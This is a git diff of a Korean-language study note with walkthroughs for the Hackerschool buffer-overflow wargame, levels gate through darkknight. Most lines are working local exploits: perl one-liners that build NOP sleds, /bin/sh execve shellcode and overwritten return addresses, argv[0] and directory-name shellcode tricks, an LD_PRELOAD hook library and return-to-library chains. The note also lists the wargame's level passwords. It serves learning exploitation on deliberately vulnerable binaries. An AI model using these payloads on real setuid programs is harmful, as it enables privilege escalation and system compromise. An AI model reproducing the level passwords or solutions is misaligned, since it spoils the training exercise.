@@ -20,7 +20,7 @@ Buffer Overflow기법에 대해서 공부하는 용도로 hackerschool에서 제
 - 환경변수에서 SHELL 포함된 내용 보기: `#> env | grep SHELL`
 - SHELL 변경: `#> chsh` 입력 후 `/bin/bash2` 입력
 
-### (01) LEVEL1: gate/gate
+## (01) LEVEL1: gate/gate
 
 ```
 0x8048430 <main>:       push   %ebp
@@ -58,9 +58,12 @@ Buffer Overflow기법에 대해서 공부하는 용도로 hackerschool에서 제
 0x8048483 <main+83>:    ret
 ```
 
-#### 문제풀이
+### 문제풀이
 
-1. 제약조건은 arg가 2개 이상이기만 하면 되므로 사용할 수 있는 공간이 많다. 가장 기본인 stack 메모리의 시작주소를 return주소로 정하였다.
+#### 제약조건
+1. arg가 2개 이상이기만 하면 됨
+#### 문제풀이
+제약조건이 하나 뿐이므로 여러가지 방법으로 문제풀이가 가능한데, 가장 기본인 stack 메모리의 시작주소를 return주소로 정하였다.
   - 셸코드 크기: 25바이트
   - "\x90"235만큼 채우면 된다.
   - `r $(perl -e 'print "SHELL CODE" . "\x90"x235 . "\x78\xf9\xff\xbf"')
@@ -75,8 +78,7 @@ Buffer Overflow기법에 대해서 공부하는 용도로 hackerschool에서 제
     bffff6d9
     ```
 
-### (02) LEVEL2: gremlin / hello bof world
-- COBOLT 
+## (02) LEVEL2: gremlin / hello bof world
 
 ```
 0x8048430  <main>:       push   %ebp   
@@ -115,7 +117,7 @@ Buffer Overflow기법에 대해서 공부하는 용도로 hackerschool에서 제
 0x804847a  <main+74>:    ret  // 함수리턴
 ```
 
-#### 문제풀이
+### 문제풀이
 
 1. 셸코드 25바이트. 스택메모리 16바이트. 셸코드를 어디에 업로드??
 ```
@@ -197,14 +199,14 @@ nop => \x90
 nop코드 있는 어떤 곳 중의 주소만 입력해도 그 뒤에 있는 셸코드 실행 가능.
 ```
 
-### (03) LEVEL3. cobolt / hacking exposed
-- GOBLIN
+## (03) LEVEL3. cobolt / hacking exposed
 
-#### 문제풀이
+### 제약조건
 - gets로 입력받음
 - 셸코드를 미리 입력해두고 파이프라인을 통해 텍스트 넘겨주고 실행시킴 (표준 출력->표준입력으로 넘겨줌)
 - 뒤에 ;cat을 추가해서 넘겨주면 정확하게 값이 넘어간다.
 
+### 문제풀이
 1. bash2로 변경
 2. 환경변수 등록(export~)
 ```
@@ -212,821 +214,406 @@ export hack=$(perl -e 'print "\x90"x10000 . "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x6
 ```
 3. perl 작성 (perl -e 'print "a"x20 . "\xe2\xfb\xff\xbf"';cat)|./goblin
 
-### (04) LEVEL4. id: goblin // pw: hackers proof
-- ORC
+## (04) LEVEL4. id: goblin // pw: hackers proof
 
-#### 문제풀이
+### 제약조건
 1. argc<=1
 2. memset environ(환경변수)
 3. argv1=="\xbf";
+
+### 문제풀이
 ```
 r $(perl -e 'print "\x90"x19 . "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80" . "\xd0\xfa\xff\xbf"')
 ```
-==> 리턴주소가 argv[1]을 가리키도록
-==> 매개변수 2개로 풀어도 된다.
 
-### (05) LEVEL5: orc / cantata
-- WOLFMAN 
+- 리턴주소가 argv[1]을 가리키도록 함
+- 매개변수 2개로 풀어도 된다.
 
-#### 문제풀이
+## (05) LEVEL5: orc / cantata
+
+### 제약조건
 1. argc<=1
 2. memset environ(환경변수)
 3. argv1=="\xbf"
 4. memset buffer
+
+### 문제풀이
 ```
 ./wolfman $(perl -e 'print "\x90"x19 . "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80" . "\x64\xfc\xff\xbf"')
 ```
 
-### (06) LEVEL6: wolfman / love eyuna
-- DARKELF 
+## (06) LEVEL6: wolfman / love eyuna
 
-#### 문제풀이
+### 제약조건
 1. argc<=1
 2. memset environ(환경변수)
 3. argv1=="\xbf"
 4. argv[1]<=48
 5. memset buffer
+
+### 문제풀이
 ```
 ./darkelf $(perl -e 'print "\x90"x19 . "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80" . "\x44\xfc\xff\xbf"')
 ```
 
-ORGE
+## (07) LEVEL7: darkelf / kernel crashed
 
- 1. argv[0]이
+### 제약조건
+1. argv[0]이 77이어야 함
+2. argv1="bf"이어야 함
+3. argv1~ 사용불가
+4. 환경변수 사용 불가
+5. 버퍼 지움.(argv[1]도 사용불가)
 
-77이어야 함
+### 문제점
+- gdb로 테스트시에는 /home/darkelf/(77에서 총 14자 뺀 63개짜리로 테스트해야함. 
+- 단,실행시에는 ."/" x72 orge 해서 테스트
 
- 2. argv1="bf"이어야
+### 문제풀이
+```
+$(perl -e 'print "." . "/"x72')orge $(perl -e 'print "\x90"x44 . "\x24\xfb\xff\xbf"') $(perl -e 'print "\x90"x10000 . "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"')
+```
 
-함
+## (08) LEVEL8: orge / timewalker
 
- 3. argv1~ 사용불가.
+### 제약조건
+1. argc=2
+2. memset environ(환경변수)
+3. argv1="\xbf"
+4. memset buffer
+5. memset argv[1]
 
- 4. 환경변수
+### 문제풀이
 
-사용 불가,
+**argv[0]을 사용하는 수 밖에 없음!**
 
- 5. 버퍼
+1. 심볼릭링크이용하여 파일이름을 셸코드로 만들기
+  - 파일이 생성되지 않음
+2. 경로이름을 셸코드로 만들기
+  - 셸코드 내의 2f가 "/"를 가리켜 생성에 오류가 생김
+  - mkdir -p옵션으로 하위디렉토리까지 생성
+  ```
+  mkdir -p aaaa$(perl -e 'print "\x90"x200 . "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"')
+  
+  r $(perl -e 'print "a"x47 . "\xbf"')
+  
+  실행
+  ./aaaa$(perl -e 'print "\x90"x200 . "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"')/../troll
+  ```
 
-지움.(argv[1]도 사용불가)
+## (09) LEVEL9: troll / aspirin
 
- 문제점.
+### 제약조건
+1. argc<=1
+2. argv1=="\xbf"
+3. argv1!="\xff" 
 
-gdb로 테스트시에는 /home/darkelf/(77에서 총
+### 문제풀이
+```
+./vampire $(perl -e 'print "a"x44 . "\x88\xd5\xfe\xbf" . "\x90"x10000') $(perl -e 'print "\x90"x10000 . "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"')
 
-14자 뺀 63개짜리로 테스트해야함)
+bf/ff가 막혀있으므로 fe부터 넣어서 ff까지 채워줌(이론상으로는 65535개)
+argv[2], argv[3] .. 계속 넣어주어 해결함
+```
 
-      단,
+## (10) LEVEL10: vampire / music world
 
-실행시에는 ."/" x72 orge 해서
+### 제약조건
+1. argc<=1
+2. memset environ(환경변수)
+3. argv1= "\xbf"
+4. argv[1]길이<=48
+5. memset buffer
+6. memset argv[0],[1]...
+  - argv[0],[1]다 지워짐
+  - 그래도 일단 argv[0]을 이용해봄
+  - ==> argv[0]이 지워지기는 하나 kernel 위에 남아있는 영역이 있음
 
-테스트
-
- $(perl -e 'print "." .
-
-"/"x72')orge $(perl -e 'print "\x90"x44 .
-
-"\x24\xfb\xff\xbf"') $(perl -e 'print "\x90"x10000 .
-
-"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"')
-
-TROLL
-
-\1. argc=2
-
-\2. memset environ(환경변수)
-
-\3. argv1="\xbf"
-
-\4. memset buffer
-
- 5. memset argv[1]
-
-해결책: argv[0]을 사용하는 수 밖에 없음!
-
-            1. 심볼릭링크이용하여 파일이름을 셸코드로 만들기 
-
-            2. 경로이름을 셸코드로 만들기
-
-\1. 파일이 생성되지 않음
-
-\2. 셸코드 내의 2f가 "/"를 가리켜 생성에 오류가 생김->mkdir -p옵션으로 하위디렉토리까지 생성
-
-mkdir -p aaaa$(perl -e 'print "\x90"x200 .
-
-"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"')
-
-r $(perl -e 'print "a"x47 . "\xbf"')
-
- 실행할때
-
-./aaaa$(perl -e 'print "\x90"x200 .
-
-"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"')/../troll
-
-이런식으로 perl로 경로를 써줘야 해결이 됨.
-
-정확한 이유는 모르겠음.
-
-VAMPIRE
-
-\1. argc<=1
-
-\2. argv1=="\xbf"
-
- 3. argv1!="\xff" 
-
-./vampire $(perl -e 'print "a"x44 . "\x88\xd5\xfe\xbf" .
-
-"\x90"x10000') $(perl -e 'print "\x90"x10000 .
-
-"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"')
-
- bf/ff가 막혀있으므로
-
-fe부터 넣어서 ff까지 채워줌.(이론상으로는 65535개) 
-
-argv[2], argv[3] .. 계속
-
-넣어주어 해결함.
-
-SKELETON
-
-\1. argc<=1
-
- 2. memset environ(환경변수)
-
-\3. argv1= "\xbf"
-
- 4. argv[1]길이<=48
-
-\5. memset buffer
-
-\6. memset argv[0],[1]...
-
-argv[0],[1]다 지워짐.
-
-일단 argv[0]을 이용해봄.
-
-==> argv[0]이 지워지기는 하나 kernel 위에 남아있는 영역이 있음
-
+### 문제풀이
+```
 mkdir -p ~~
 
- ./zzzz$(perl -e 'print
+./zzzz$(perl -e 'print "\x90"x200 . "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"')/../../../aaaaaaaaaa $(perl -e 'print "a"x44 . "\x10\xff\xff\xbf"')
+  
+디렉토리 이름을 셸코드로~
+argv를 다 지우지만 남아있는 영역이 있음. 그 주소(bf/ff/ff/10)를 가리키면 깨진다!
+```
 
-"\x90"x200 .
+## (11) LEVEL11 skeleton / shellcoder
 
-"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"')/../../../aaaaaaaaaa
+### 제약조건
+1. argc>=2
+2. argv1="\xbf"
+3. memset buffer
+4. memset all argv영역
 
-$(perl -e 'print "a"x44 . "\x10\xff\xff\xbf"')
+### 참고사항
+- memset : dest가 가리키는 메모리를 c값으로 count 만큼 채운다.
+  + void *memset ( void *dest, int c, size_t count );
+- Parameters
+  + dest : 채울 대상이 되는 메모리
+  + c : 메모리에 채울 값, int형이지만 1바이트(char)로 인식
+  + count : c값을 대상 메모리에 채울 개수
 
- 디렉토리
+### 문제풀이
+- LD_PRELOAD라는 환경변수를 임의로 만들어준다.(기본적으로 들어가지는 않음)
+- cat maps
+- 40..으로 시작되는 주소에 /lib/ld./xxxx.so라는 것이 있음
+- 원래 함수보다 먼저 내가 함수를 로드 시켜놓으면 내가 올려놓은 함수가 실행된다.(후킹이라고 함)
 
-이름을 셸코드로~
-
- argv를 다 지우지만
-
-남아있는 영역이 있음. 그 주소(bf/ff/ff/10)를 가리키면 깨짐
-
-\1. argc>=2
-
-\2. argv1="\xbf"
-
-\3. memset buffer
-
-\4. memset all argv영역
-
-어떻게??
-
-<풀이방법>
-
-LD_PRELOAD라는 환경변수를 임의로 만들어줌.(기본적으로 들어가지는 않음)
-
-cat maps
-
-40..으로 시작되는 주소에 /lib/ld./xxxx.so라는 것이
-
-있음
-
-원래 함수보다 먼저 내가 함수를 로드 시켜놓으면 내가 올려놓은 함수가 실행됨.
-
-(후킹이라고 함)
-
+```
 uid_t get_uid
 
 #include <unistd.h>
-
 #include <sys/types.h>
 
 uid_t getuid(){
-
-return 9999;
-
+  return 9999;
 }
 
-gcc -o hook.so hook.c --shared -fPIC
+$ gcc -o hook.so hook.c --shared -fPIC
 
-export LD_PRELOAD=/home/skeleton/hook.so
+$ export LD_PRELOAD=/home/skeleton/hook.so
 
-##환경변수 지우는법 unset LD_PRELOAD
+환경변수 지우는법 
+$ unset LD_PRELOAD
 
-env | grep LD_PRELOAD
+$ env | grep LD_PRELOAD
 
-이렇게 해서 #>id 해 보면 
+이렇게 해서 
+#>id 해 보면 
 
-LD_PRELOAD=/home/skeleton/hook.so 가 보임.
+LD_PRELOAD=/home/skeleton/hook.so 가 보인다.
 
-$(perl -e 'print "\x90"x100000 .
+$(perl -e 'print "\x90"x100000 . "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"')
 
-"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"')
+mkdir -p $(perl -e 'print "aaaa" . "\x90"x200 . "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"')
 
-mkdir -p $(perl -e 'print "aaaa" . "\x90"x200 .
+export LD_PRELOAD=./$(perl -e 'print "aaaa" . "\x90"x200 . "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"')/../../../hook.so
 
-"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"')
-
-export LD_PRELOAD=./$(perl -e 'print "aaaa" . "\x90"x200 .
-
-"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"')/../../../hook.so
-
-./$(perl -e 'print "aaaa" . "\x90"x200 .
-
-"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"')/../../../aa
+./$(perl -e 'print "aaaa" . "\x90"x200 . "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"')/../../../aa
 
 r $(perl -e 'print "a"x44 . "\x0b\xf3\xff\xbf"')
-
 0xbffff30b:
 
 ./golem $(perl -e 'print "a"x44 ."\x2b\xf4\xff\xbf"')
 
-      
+ebp-3000정도 부터 x/s로 찾아보다보면 LD_PRELOAD에 올려놓은 내용이 보임
+```
 
-ebp-3000정도 부터 x/s로 찾아보다보면 LD_PRELOAD에 올려놓은 내용이 보임.
+## (12) LEVEL12: golem / cup of coffee
 
-problem_child라는 함수가
+### 문제 개요
+- problem_child라는 함수가 있음
+- 이 함수 내에는 strncpy가 있음(src가 dest보다 strncpy strcpy보다 작은 수 복사(뒤에 null붙음)
 
-있음.
-
--이 함수 내에는 strncpy가 있음(src가 dest보다 
-
-strncpy strcpy보다 작은 수 복사.(뒤에 null붙음)
-
+**assembly 코드**
+```
 <main>
 
-0x804846c <main>:      
+0x804846c <main>:       push   %ebp
+0x804846d <main+1>:     mov    %ebp,%esp
+0x804846f <main+3>:     cmp    DWORD PTR [%ebp+8],1
+0x8048473 <main+7>:     jg     0x8048490 <main+36>
+0x8048475 <main+9>:     push   0x8048504 
+0x804847a <main+14>:    call   0x8048354 <printf>
+0x804847f <main+19>:    add    %esp,4
+0x8048482 <main+22>:    push   0
+0x8048484 <main+24>:    call   0x8048364 <exit>
+0x8048489 <main+29>:    add    %esp,4
 
-push   %ebp
-
- 0x804846d
-
-<main+1>:     mov   
-
-%ebp,%esp
-
- 0x804846f
-
-<main+3>:     cmp    DWORD PTR
-
-[%ebp+8],1
-
- 0x8048473
-
-<main+7>:     jg     0x8048490
-
-<main+36>
-
- 0x8048475
-
-<main+9>:     push   0x8048504
-
- 0x804847a
-
-<main+14>:    call   0x8048354
-
-<printf>
-
- 0x804847f
-
-<main+19>:    add    %esp,4
-
- 0x8048482
-
-<main+22>:    push   0
-
- 0x8048484 <main+24>:   
-
-call   0x8048364 <exit>
-
- 0x8048489
-
-<main+29>:    add    %esp,4
-
-0x804848c <main+32>:    lea   
-
-%esi,[%esi*1]
-
- 0x8048490
-
-<main+36>:    mov    %eax,DWORD PTR
-
-[%ebp+12]
-
- 0x8048493
-
-<main+39>:    add    %eax,4
-
- 0x8048496
-
-<main+42>:    mov    %edx,DWORD PTR
-
-[%eax]
-
- 0x8048498
-
-<main+44>:    push   %edx
-
- 0x8048499
-
-<main+45>:    call   0x8048440
+0x804848c <main+32>:    lea    %esi,[%esi*1]
+0x8048490 <main+36>:    mov    %eax,DWORD PTR [%ebp+12]
+0x8048493 <main+39>:    add    %eax,4
+0x8048496 <main+42>:    mov    %edx,DWORD PTR [%eax]
+0x8048498 <main+44>:    push   %edx
+0x8048499 <main+45>:    call   0x8048440 <problem_child>
+0x804849e <main+50>:    add    %esp,4 
+0x80484a1 <main+53>:    leave
+0x80484a2 <main+54>:    ret
 
 <problem_child>
+0x8048440 <problem_child>:      push   %ebp
+0x8048441 <problem_child+1>:    mov    %ebp,%esp
+0x8048443 <problem_child+3>:    sub    %esp,40
+0x8048446 <problem_child+6>:    push   41
+0x8048448 <problem_child+8>:    mov    %eax,DWORD PTR [%ebp+8]
+0x804844b <problem_child+11>:   push   %eax
+0x804844c <problem_child+12>:   lea    %eax,[%ebp-40]
+0x804844f <problem_child+15>:   push   %eax
+0x8048450 <problem_child+16>:   call   0x8048374 <strncpy>
+0x8048455 <problem_child+21>:   add    %esp,12
+0x8048458 <problem_child+24>:   lea    %eax,[%ebp-40]
+0x804845b <problem_child+27>:   push   %eax
+0x804845c <problem_child+28>:   push   0x8048500
+0x8048461 <problem_child+33>:   call   0x8048354 <printf>
+0x8048466 <problem_child+38>:   add    %esp,8 
+0x8048469 <problem_child+41>:   leave
+0x804846a <problem_child+42>:   ret
+0x804846b <problem_child+43>:   nop
+```
 
- 0x804849e
-
-<main+50>:    add    %esp,4
-
- 0x80484a1
-
-<main+53>:    leave
-
- 0x80484a2
-
-<main+54>:    ret
-
-<problem_child>
-
-0x8048440 <problem_child>:     
-
-push   %ebp
-
- 0x8048441
-
-<problem_child+1>:    mov   
-
-%ebp,%esp
-
- 0x8048443
-
-<problem_child+3>:    sub   
-
-%esp,40
-
- 0x8048446
-
-<problem_child+6>:    push   41
-
- 0x8048448
-
-<problem_child+8>:    mov    %eax,DWORD PTR
-
-[%ebp+8]
-
- 0x804844b
-
-<problem_child+11>:   push   %eax
-
- 0x804844c
-
-<problem_child+12>:   lea   
-
-%eax,[%ebp-40]
-
- 0x804844f
-
-<problem_child+15>:   push   %eax
-
- 0x8048450
-
-<problem_child+16>:   call   0x8048374
-
-<strncpy>
-
- 0x8048455
-
-<problem_child+21>:   add    %esp,12
-
- 0x8048458
-
-<problem_child+24>:   lea   
-
-%eax,[%ebp-40]
-
- 0x804845b
-
-<problem_child+27>:   push   %eax
-
- 0x804845c
-
-<problem_child+28>:   push   0x8048500
-
- 0x8048461
-
-<problem_child+33>:   call   0x8048354
-
-<printf>
-
- 0x8048466
-
-<problem_child+38>:   add    %esp,8
-
- 0x8048469
-
-<problem_child+41>:   leave
-
- 0x804846a
-
-<problem_child+42>:   ret
-
- 0x804846b
-
-<problem_child+43>:   nop
-
-<c코드로 변환>
-
+**c언어로 예측하여 변환한 코드**
+```
 problem_child(*src){
+  char buffer[40];
+  strncpy(buffer,src,41);
+  printf("%s\n",buffer);
+}
 
- char buffer[40];
+int main(){
+  if(argc<=1){
+    printf("argv error\n");
+    exit(0);
+  }
+  
+  problem_child(argv[1]);
+  return 0;
+}
+```
 
- strncpy(buffer,src,41);
-
- printf("%s\n",buffer);
-
- }
-
- int main(){
-
- if(argc<=1){
-
- printf("argv error\n");
-
- exit(0);
-
- }
-
- problem_child(argv[1]);
-
- return 0;
-
- }
-
-\1. 41바이트 복사
-
-\2. 리턴주소의 마지막 주소만 변환 가능.
-
+### 제약조건
+1. 41바이트 복사
+2. 리턴주소의 마지막 주소만 변환 가능
 3. argv>=1
+4. main함수->problem_child->main함수넘어갔다오는 과정에서 esp가 4 증가?되므로 조절 필요
 
-\3. main함수->problem_child->main함수넘어갔다오는 과정에서
+### 문제풀이
+```
+./darkknight $(perl -e 'print "\x90"x15 . "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80" . "\xbc"')
 
-esp가 4 증가?되므로 조절 필요.
+맨앞에는 셸코드, 41번째 바이트에 들어가는게 맨 뒤 주소
+```
 
-./darkknight $(perl -e 'print "\x90"x15 .
+### 문제풀이
+다른 방법을 이용하여 풀이
 
-"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"
-
-. "\xbc"')
-
-41번째 바이트에 들어가는게 맨뒤 주소. 맨앞에는 셸코드
-
-강사님 풀이
-
+```
 함수 2개 int 함수, problem child
-
 strncpy: 오버플로우 방지위해 사용
-
-strcpy가 사이즈 검사하지 않음.
-
-strncpy는 사이즈를 정해줌.
-
+strcpy가 사이즈 검사하지 않음
+strncpy는 사이즈를 정해줌
 40->41바이트로 복사
+마지막 파일에 \0을 넣을 수 있도록 1바이트의 여유공간이 있어 1바이트 오버플로우 발생
+prob-child의strncpy와 브레이크 해두면 ebp확인가능(p-c함수의 ebp)
 
-마지막 파일에 \0을 넣을 수 있도록 1바이트의 여유공간이 있어 1바이트 오버플로우 발생.
-
-prob-child의strncpy와 브레이크 해두면
-
-ebp확인가능(p-c함수의 ebp)
-
-leave: 2개의 명령어 포함
-
-mov esp, ebp
-
+leave: 2개의 명령어 포함(mov esp, ebp)
 ==>pop ebp
-
 ==>leave에 브레이크 걸고 전후 모습을 보면
 
 ret
-
 ==>pop eip
 
-info reg ebp esp해서
-
-봄
-
-ebp가 오버플로우 된 주소로 나옴
-
+info reg ebp esp해서 보면 ebp가 오버플로우 된 주소로 나옴
 esp+4
-
 leave에 esp에 ebp가 저장됨
-
-ret에 pop eip가 됨. ebp+4가 eip가 되므로
-
-ebp+4로 ret되게 됨!
-
+ret에 pop eip가 됨. ebp+4가 eip가 되므로 ebp+4로 ret되게 됨!
 따라서 ebp를 원하는 주소 -4에 셸코드 넣어놓으면 깰 수 있음
 
-셸코드주소 4바이트 전에 ebp를 넣어주어야 함.
+셸코드주소 4바이트 전에 ebp를 넣어주어야 함
 
 환경변수에 셸코드 로드해서 풀이
-
 4바이트 ebp 36바이트 \xcc
+```
 
-문제: bugbear
+## (13) LEVEL13: darkknight / new attacker
 
-\1. argc>1
+### 제약조건
+1. argc>1
+2. argc1!="\xbf" ==? 어떻게??
+  - strcpy(buffer,argv[1])
+  - bf를 사용할 수 없으므로 스택메모리를 사용할 수 없음
+  - @RTL(Return To Library)
+    + RTL의 전신: Omega Project(셸코드를 사용하지않고 루트권한 획득할 수 있을까? 라는 화두에서 시작)
 
-\2. argc1!="\xbf" ==? 어떻게??
+#### 어셈블리 코드의 동작을 알아보기 위해 `test.c` 파일을 만든 후, 이를 컴파일한 결과 나오는 바이너리 코드로 테스트 수행
 
-strcpy(buffer,argv[1])
-
-bf를 사용할 수 없으므로 스택메모리를 사용할 수 없음.
-
-@RTL(Return To Library)
-
--RTL의 전신: Omega Project(셸코드를 사용하지않고 루트권한 획득할 수 있을까?라는 화두에서 시작)
-
+```
 test.c
 
 void dummy01(){ printf("call dummy01\n"); }
+void dummy02(){ printf("call dummy02\n"); }
+void dummy03(){ printf("call dummy03\n"); }
+void dummy04(){ printf("call dummy04\n"); }
+void dummy05(){ printf("call dummy05\n"); }
 
- void dummy02(){ printf("call
+int main(int argc, char *argv[]){
+  char buffer[100]={0,};
+  strcpy(buffer,argv[1]);
+  printf("%s\n",buffer);
+  return 0;
+}
+```
 
-dummy02\n"); }
-
- void dummy03(){ printf("call
-
-dummy03\n"); }
-
- void dummy04(){ printf("call
-
-dummy04\n"); }
-
- void dummy05(){ printf("call
-
-dummy05\n"); }
-
- int
-
-main(int argc, char *argv[]){
-
- char buffer[100]={0,};
-
- strcpy(buffer,argv[1]);
-
- printf("%s\n",buffer);
-
- return 0;
-
- }
-
-disassemble main해서
-
-보면 호출하지 않았으니 dummy를 볼 수 없으나
-
-disassemble dummy01해서 보면이미 메모리에 올라가있음
-
+```
+disassemble main 해서 보면 호출하지 않았으니, dummy를 볼 수 없으나
+disassemble dummy01 해서 보면이미 메모리에 올라가있음
 dummy함수 시작주소만 알 수 있으면 이를 호출해서 쓸 수 있음
 
-./test $(perl "a"x104 . dummy함수의
-
-시작주소 써주면 dummy함수 호출됨.
+./test $(perl "a"x104 . dummy함수의 시작주소 써주면 dummy함수 호출됨.
 
 (gdb) disassemble dummy02
 
- 0x8048414
-
-<dummy02>:    push   %ebp
+0x8048414 <dummy02>:    push   %ebp
 
 dummy02의 시작주소: 0x8048414
 
-./test $(perl -e 'print "a"x104 .
+./test $(perl -e 'print "a"x104 . "\x14\x84\x04\x08"')
+```
 
-"\x14\x84\x04\x08"')
+#### 결과
+```
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+call dummy02     <<dummy02함수 호출된 모습>> 
+Segmentation fault (core dumped)
+```
 
-결과
-
-여러개 함수를 한번에 호출하고싶다면?
-
-dummy01은 0x8048400 <dummy01>:   
-
-push   %ebp
-
-00인 NULL값이 들어가므로 호출할 수 없음
-
+#### 여러개 함수를 한번에 호출하고싶다면?
+```
+dummy01은 0x8048400 <dummy01>:    push   %ebp
+// 00인 NULL값이 들어가므로 호출할 수 없음
 dummy02: 0x8048414
-
 dummy03: 0x8048428
-
 dummy04: 0x804843c
-
-함수 종료시 
-
+// 함수 종료시 
 ebp: ad8, esp: a70
-
-leave: ebp: 41414141, esp: adb//esp에 들어있던주소가 eip로 들어가서 함수 호출
-
+leave: ebp: 41414141, esp: adb
+//esp에 들어있던주소가 eip로 들어가서 함수 호출
 ret
 
-   ebp  /  esp(dummy01주소)
+ebp  /  esp(dummy01주소)
 
 [fad8] / [fadc]
+          faec(because of pop)
+     esp: fadc
 
-             faec(b cuz of pop)
-
-      esp: fadc
-
-ret후에 다음함수 볼때에는 si로 봐야함. 프롤로그에는 브레이크 걸리지 않음
-
+ret후에 다음함수 볼때에는 si로 봐야한다.(프롤로그에는 브레이크 걸리지 않음)
 리턴주소에 연결해서 쓰면 호출하고자하는 함수를 한번에 출력가능하다.
 
 call은 jmp와 달리 다음 실행될 주소를 가지고있게 되어 esp가 이동되게 됨.
 
- ./test $(perl -e 'print
+./test $(perl -e 'print "a"x104 . "\x14\x84\x04\x08" . "\x28\x84\x04\x08" . "\x3c\x84\x04\x08"')
+```
 
-"a"x104 . "\x14\x84\x04\x08" . "\x28\x84\x04\x08"
+#### 결과
+```
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+call dummy02
+call dummy03
+call dummy04
+Segmentation fault (core dumped)
+```
 
-. "\x3c\x84\x04\x08"')
-
-결과
-
+```
 ebp는 호출되기 전에 실행되고있던 함수의 ebp
-
-프롤로그 push ebp
-
-               mov ebp, esp
-
-에필로그
-
- leave:     
-
-mov     esp,     ebp // esp에
-
-ebp넣어줌
-
-     pop     ebp        
-
-   // esp가 가리키는곳의 값을 ebp에 넣어줌.
-
-ret:     pop     eip
-
-(실습)
-
-void dummy01(int a){ printf("call dummy01:%d\n",a); }
-
- void dummy02(int a){ printf("call
-
-dummy02:%d\n",a); }
-
- void dummy03(int a){ printf("call
-
-dummy03:%d\n",a); }
-
- void dummy04(int a){ printf("call
-
-dummy04:%d\n",a); }
-
- int main(int argc, char
-
-*argv[]){
-
- char
-
-buffer[100]={0,};
-
- strcpy(buffer,argv[1]);
-
- printf("%s\n",buffer);
-
- return 0;
-
- }
-
-결과가
-
-call dummy 02: 99999999
-
-call dummy 03: 88888888
-
-call dummy 04: 77777777
-
-되도록.
-
-dummy02: 0x8048418
-
-dummy03: 0x8048430
-
-dummy04: 0x8048448
-
-./test2 $(perl -e 'print "a"x104 . "\x18\x84\x04\x08" .
-
-"\x30\x84\x04\x08" . "\x48\x84\x04\x08"')
-
-레지스터 보기: info reg esi ebp..
-
-call dummy02:134513736
-
- call dummy03:-1073743104
-
- call dummy04:1073821800
-
-esp          
-
-0xbffffae0       -1073743136 
-
- ebp           
-
-0xbffffb48      
-
--1073743032  0x400309cb==>10000604713
